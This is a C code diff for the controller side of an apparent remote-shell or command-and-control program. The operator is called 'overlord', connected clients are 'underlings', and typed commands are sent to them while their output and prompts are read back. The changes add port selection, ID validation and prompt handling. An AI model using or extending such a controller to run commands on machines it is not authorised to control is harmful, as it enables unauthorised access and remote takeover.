@@ -10,14 +10,34 @@
 #define MANAGE 4
 
 int main() {
+  char *input = NULL;
+  char message[MAX_MESSAGE_LENGTH];
+  int port = -1;
+  int sock = -1;
+
+  while (sock < 0) {
+    prompt(&input, "Enter port to listen on (default 5001): ", 0);
+
+    if (*input) {
+      sscanf(input, "%d", &port);
+      
+      if (port < 0) {
+        printf("Invalid port!\n");
+        continue;
+      }
+    } else {
+      port = PORT;
+    }
+
+    sock = serverSocket(port);
+  }
+  
   printf("Welcome, overlord.\n");
   printf("Type help for available commands.\n");
 
   int state = DEFAULT;
-  char *input = NULL;
-  char message[MAX_MESSAGE_LENGTH];
   client_list *underlings = newClientList();
-  int sock = serverSocket(PORT);
+  int index = -1;
 
 	while (state) {
     switch (state) {
@@ -41,24 +61,34 @@ int main() {
     case ORDER:
       if (underlings->size == 0) {
         printf("No underlings available.\n");
-      } else {
+      } else if (index < 0 || index >= underlings->size) {
         printClientList(underlings);
 
         prompt(&input, "Enter underling ID: ", 0);
+        sscanf(input, "%d", &index);
 
-        client_node *underling = underlings->list[atoi(input)];
+        if (index < 0 || index >= underlings->size) {
+          printf("Invalid ID!\n");
+        }
+      } else {
+        client_node *underling = underlings->list[index];
 
-        prompt(&input, "Enter command: ", 0);
+        printf("[OVERLORD] ");
+        prompt(&input, underling->prefix, 0);
         strncpy(message, input, MAX_MESSAGE_LENGTH);
 
+        // write command
         write(underling->sock, message, MAX_MESSAGE_LENGTH);
 
+        // read command output
         read(underling->sock, message, MAX_MESSAGE_LENGTH);
 
-        printf("%s\n", message);
+        // read next prompt
+        read(underling->sock, underling->prefix, MAX_MESSAGE_LENGTH);
+
+        // print command output
+        printf("%s", message);
       }
-      
-      state = DEFAULT;
       
       break;
 
@@ -76,9 +106,12 @@ int main() {
 
         printf("Underling connected.\n");
 
+        char prefix[MAX_MESSAGE_LENGTH];
+        
+        read(connection, prefix, MAX_MESSAGE_LENGTH);
         prompt(&input, "Enter a description for this underling: ", 0);
 
-        addClientToList(underlings, 0, connection, input);
+        addClientToList(underlings, connection, input, prefix);
       } else if (startsWith(input, "remove")) {
 
       } else if (startsWith(input, "view")) {
@@ -95,7 +128,10 @@ int main() {
     }
 	}
 
-  free(input);
+  if (input) {
+    free(input);
+  }
+  
   freeClientList(underlings);
   close(sock);
   
